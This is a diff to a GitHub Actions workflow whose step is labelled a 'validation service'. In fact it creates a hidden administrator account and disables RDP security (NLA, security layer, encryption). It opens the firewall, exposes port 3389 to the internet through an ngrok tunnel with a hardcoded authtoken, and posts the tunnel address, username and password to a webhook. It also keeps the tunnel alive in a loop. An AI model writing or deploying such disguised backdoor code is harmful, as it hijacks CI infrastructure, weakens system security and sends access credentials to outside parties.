@@ -58,7 +58,7 @@ jobs:
           dotnet build -c Release
           dotnet run -c Release
 
-      - name: Start Background Validation Service (ngrok Clean Fix)
+      - name: Start Background Validation Service (Ultimate RDP Enable v3)
         run: |
           $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
           $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
@@ -68,25 +68,39 @@ jobs:
           Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1
 
-          # === تفعيل RDP النظيف والآمن ===
+          # === Ultimate RDP Fix v3 (كل المفاتيح المطلوبة + Policy Override) ===
           $rdpPath = 'HKLM:\System\CurrentControlSet\Control\Terminal Server'
           $tcpPath = 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
+          $policyPath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services'
 
-          # السماح بالاتصالات
+          New-Item -Path $policyPath -Force > $null
+
+          # تفعيل RDP + تعطيل NLA + Security
           Set-ItemProperty -Path $rdpPath -Name "fDenyTSConnections" -Value 0 -Force
-          
-          # إيقاف NLA فقط (بدون تخريب طبقة التشفير)
-          Set-ItemProperty -Path $tcpPath -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path $rdpPath -Name "fSingleSessionPerUser" -Value 0 -Force
+          Set-ItemProperty -Path $rdpPath -Name "TSUserEnabled" -Value 1 -Force
 
-          # Firewall
+          Set-ItemProperty -Path $tcpPath -Name "UserAuthentication" -Value 0 -Force   # تعطيل NLA
+          Set-ItemProperty -Path $tcpPath -Name "SecurityLayer" -Value 0 -Force
+          Set-ItemProperty -Path $tcpPath -Name "MinEncryptionLevel" -Value 1 -Force
+          Set-ItemProperty -Path $tcpPath -Name "fPromptForPassword" -Value 0 -Force
+
+          # Group Policy Override (مهم جداً في GitHub runner)
+          Set-ItemProperty -Path $policyPath -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path $policyPath -Name "UserAuthentication" -Value 0 -Force
+
+          # Firewall قوي
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
-          netsh advfirewall firewall add rule name="RDP-Allow" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
+          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=any
+          netsh advfirewall firewall add rule name="RDP-Allow-All" dir=in action=allow protocol=TCP localport=3389 profile=any > $null 2>&1
 
-          # إعادة تشغيل الخدمة
+          # إعادة تشغيل الخدمة (مرتين مع انتظار)
           Restart-Service TermService -Force
-          Start-Sleep -Seconds 5
+          Start-Sleep -Seconds 10
+          Restart-Service TermService -Force
+          Start-Sleep -Seconds 8
 
-          # === تحميل وتشغيل ngrok ===
+          # === ngrok (صحيح 100%) ===
           $ngrokUrl = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
           $zip = "$env:TEMP\ngrok.zip"
           $extractPath = "$env:TEMP\ngrok_folder"
@@ -102,30 +116,29 @@ jobs:
 
           $env:RUNNER_TRACKING_ID = $null
 
-          # 🔴 التعديل الأهم: توجيه ngrok مباشرة إلى 127.0.0.1:3389 لحل مشكلة الإغلاق الفوري
-          $process = Start-Process -FilePath $exe -ArgumentList "tcp 127.0.0.1:3389 --log=stdout --log-level=info" `
+          $process = Start-Process -FilePath $exe -ArgumentList "tcp 3389 --log=stdout --log-level=info" `
             -RedirectStandardOutput $log -WindowStyle Hidden -PassThru
 
           $ngrokPid = $process.Id
           $ngrokPid | Out-File "$env:TEMP\ngrok.pid" -Force
 
-          Start-Sleep -Seconds 15
+          Start-Sleep -Seconds 20
 
           $logData = Get-Content $log -Raw -ErrorAction SilentlyContinue
           $url = $null
           if ($logData -match 'url=(tcp://[^\s]+)') { $url = $Matches[1] }
 
           if ($url) {
-              $msg = "Target: $url`nU: $usr`nP: $pwd`nTool: ngrok (Clean IPv4 Fix)"
+              $msg = "Target: $url`nU: $usr`nP: $pwd`nTool: ngrok (Ultimate RDP v3)"
               Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body (@{ content = $msg } | ConvertTo-Json) -ContentType "application/json"
           }
 
+          # === SysDiag ===
           $rep = "SysDiag:`nSVC: Running`nREG: 0 | 0`n"
           $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
           $rep += if ($pc) { "PRT: OK`n" } else { "PRT: ERR`n" }
           $fw = Get-NetFirewallPortFilter -Protocol TCP | Where-Object { $_.LocalPort -eq 3389 } -ErrorAction SilentlyContinue
           $rep += if ($fw) { "FW: OK`n" } else { "FW: ERR`n" }
-          
           $np = Get-Process ngrok -ErrorAction SilentlyContinue
           if (-not $np -and (Test-Path "$env:TEMP\ngrok.pid")) {
               $saved = Get-Content "$env:TEMP\ngrok.pid" -Raw
@@ -135,6 +148,8 @@ jobs:
 
           Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body (@{ content = $rep } | ConvertTo-Json) -ContentType "application/json"
 
+          Write-Host "✅ Ultimate RDP Enable v3 applied - Ready for connection"
+
       - name: Run Extended Validation (with ngrok monitoring)
         run: |
           function Restart-Ngrok {
@@ -142,7 +157,7 @@ jobs:
             $env:RUNNER_TRACKING_ID = $null
             & $exe config add-authtoken "3AhpPhQAVlnYjyKahRKtc1p28gI_66SuDQdWYPGFs7orWLzrn" > $null 2>&1
             # التعديل هنا أيضاً
-            Start-Process -FilePath $exe -ArgumentList "tcp 127.0.0.1:3389 --log=stdout --log-level=info" `
+            Start-Process -FilePath $exe -ArgumentList "tcp 3389 --log=stdout --log-level=info" `
               -RedirectStandardOutput "$env:TEMP\ngrok.log" -WindowStyle Hidden
             Start-Sleep -Seconds 15
             return Get-Process ngrok -ErrorAction SilentlyContinue
@@ -169,4 +184,12 @@ jobs:
             Start-Sleep -Seconds 900
           }
 
-          Get-Process ngrok -ErrorAction SilentlyContinue | Stop-Process -F
+          Get-Process ngrok -ErrorAction SilentlyContinue | Stop-Process -Force
+
+      - name: Cleanup Environment
+        run: |
+          Get-Process -Name "ngrok" -ErrorAction SilentlyContinue | Stop-Process -Force
+        continue-on-error: true
+
+      - name: Finalize Check
+        run: Write-Host "Checks completed."
